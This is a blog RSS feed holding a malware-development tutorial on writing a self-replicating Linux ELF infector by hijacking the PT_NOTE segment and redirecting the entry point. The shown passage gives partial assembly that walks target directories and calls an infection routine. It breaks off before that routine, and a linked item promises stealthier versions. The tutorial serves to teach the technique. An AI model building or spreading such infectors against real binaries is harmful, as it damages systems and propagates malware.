<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>About on Hacklagr0y</title>
    <link>https://alagroy-42.github.io/</link>
    <description>Recent content in About on Hacklagr0y</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 14 Jun 2022 14:23:54 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Advanced infectors: How to make our infector stealthy and hardly detectable</title>
      <link>https://alagroy-42.github.io/malware_dev/infector_advanced/</link>
      <pubDate>Mon, 20 Jun 2022 14:25:16 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/infector_advanced/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>Infectors: how to make a simple self-replicating program on Linux.</title>
      <link>https://alagroy-42.github.io/malware_dev/infector_basics/</link>
      <pubDate>Mon, 20 Jun 2022 12:11:52 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/infector_basics/</guid>
      <description>Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later).</description>
      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
&lt;p&gt;During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple &lt;code&gt;readelf&lt;/code&gt; command (We will get more into that later).&lt;/p&gt;
&lt;p&gt;You can check the full source code &lt;a href=&#34;https://github.com/alagroy-42/note_infector&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;how-does-it-work-&#34;&gt;How does it work ?&lt;/h3&gt;
&lt;p&gt;The technique that we will use here is called PT_NOTE segment hijacking. To understand how it works, we first need to understand the ELF format. The first element of an ELF file is the ELF header, it gives us the info we need to understand and read the rest of the file. Then comes the Program Header table, it will describe how the file is being organized. Each program header describes a part of the file, a part can belong to several program headers. Each entry is described by the following C structure (&lt;code&gt;man elf&lt;/code&gt; for more information).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_type;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_flags;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Off  p_offset;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_vaddr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_paddr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_filesz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_memsz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_align;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } Elf64_Phdr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;p_type&lt;/code&gt; field describes what kind of program header it is. There are two types that interests us :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_LOAD: The array element specifies a loadable segment, described by p_filesz and p_memsz. The bytes from the file are mapped to the beginning of the memory segment. If the segment&#39;s memory size p_memsz is larger than the file size p_filesz, the &amp;quot;extra&amp;quot; bytes are defined to hold the value 0 and to follow the segment&#39;s initialized area. The file size may not be larger than the memory size. Loadable segment entries in the program header table appear in ascending order, sorted on the p_vaddr member.&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_NOTE: The array element specifies the location of notes (ElfN_Nhdr).&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;PT_LOAD&lt;/code&gt; are being loaded in memory which means that with the right permissions, we can execute the content of it. The &lt;code&gt;PT_NOTE&lt;/code&gt; simply gives the location of notes that are useless for the program during its execution. There should be a &lt;code&gt;PT_NOTE&lt;/code&gt; segment on every binary compiled the usual way. The technique will consists in changing this &lt;code&gt;PT_NOTE&lt;/code&gt; segment to a &lt;code&gt;PT_LOAD&lt;/code&gt; pointing to the end of the file where we will put our code. This way, it will be mapped into memory without altering the file too much and we will be able to execute it.&lt;/p&gt;
&lt;p&gt;To execute it, we will look a bit more at the ELF header structure defined as&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define EI_NIDENT 16
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; e_ident[EI_NIDENT];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_type;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_machine;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_version;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Addr     e_entry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_phoff;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_shoff;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_flags;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_ehsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phentsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shentsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shstrndx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } ElfN_Ehdr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The field that interests us here is &lt;code&gt;e_entry&lt;/code&gt; which will define the entrypoint of our program. If we put our code, the program will execute it and we will just have to transfer the execution back to the original entrypoint so that the program can keep its course.&lt;/p&gt;
&lt;h3 id=&#34;the-code&#34;&gt;The code&lt;/h3&gt;
&lt;h4 id=&#34;filesystem-reading&#34;&gt;Filesystem reading&lt;/h4&gt;
&lt;p&gt;The first thing to do will be finding files to infect. For safety reason and because we don&amp;rsquo;t want to launch our program as root, we will not look for those in &lt;code&gt;/bin&lt;/code&gt; or &lt;code&gt;/usr/bin&lt;/code&gt; but in &lt;code&gt;/tmp/test&lt;/code&gt; and &lt;code&gt;/tmp/test2&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel cwd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax      &lt;span style=&#34;color:#75715e&#34;&gt;; We open and save the fd of the cwd so that we will be able&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; to chdir back to it after we are don&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir1] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir2] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_FCHDIR
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; Back to our initial cwd to not break the executed binary (eg. ls)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code chunk will allow us to call the &lt;code&gt;readdir&lt;/code&gt; function that we will use to run through files in both of the target directories. To use those files then, we want to open them with relative paths to avoid string operations that are a bit painful in ASM so we will use &lt;code&gt;chdir&lt;/code&gt; to open them directly. Our first step to avoid breaking the infected program (eg &lt;code&gt;ls&lt;/code&gt;) will be to open our current working directory to be able to get back to it once the job is done.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readdir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CHDIR  &lt;span style=&#34;color:#75715e&#34;&gt;; Let&amp;#39;s change the directory to open file,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; string operations are painful in ASM so relative paths will do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_ANONYMOUS &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; MAP_PRIVATE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;dec&lt;/span&gt;     r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_MMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; We map a page for the getdents buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     end_readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_dir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, DIRENT_MAX_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_GETDENTS64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jle&lt;/span&gt;     end_readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_buf_dirent:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;], r8w
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_type], DT_REG
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_dirent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_name]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    infect          &lt;span style=&#34;color:#75715e&#34;&gt;; We only infect regular files &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_dirent:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   r8, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_reclen]
